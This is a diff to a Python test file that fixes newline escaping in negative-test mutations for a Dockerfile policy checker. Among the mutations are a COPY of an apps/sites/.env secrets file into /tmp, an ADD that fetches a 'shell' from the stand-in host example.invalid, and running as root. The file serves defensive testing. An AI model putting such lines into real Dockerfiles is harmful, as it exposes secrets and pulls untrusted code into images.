@@ -90,11 +90,11 @@ def test_negatives(path: str, source: str) -> None:
         "root-runtime":source.replace("USER 10001:10001","USER root",1),
         "no-user":source.replace("USER 10001:10001","",1),
         "wide-context":source+"\nCOPY . /workspace\n",
-        "secret-copy":source+"\\nCOPY apps/sites/.env /tmp/.env\\n",
-        "copy-flags":source+"\\nCOPY --chown=root:root . /tmp\\n",
-        "remote-add":source+"\\nADD https://example.invalid/shell /tmp/shell\\n",
-        "second-stage":source+"\\nFROM alpine:3.20\\n",
-        "extra-composer":source+"\\nRUN composer install --no-plugins --no-scripts\\n",
+        "secret-copy":source+"\nCOPY apps/sites/.env /tmp/.env\n",
+        "copy-flags":source+"\nCOPY --chown=root:root . /tmp\n",
+        "remote-add":source+"\nADD https://example.invalid/shell /tmp/shell\n",
+        "second-stage":source+"\nFROM alpine:3.20\n",
+        "extra-composer":source+"\nRUN composer install --no-plugins --no-scripts\n",
     }
     mutations["discovery-before-user"]=source.replace(
         "USER 10001:10001",
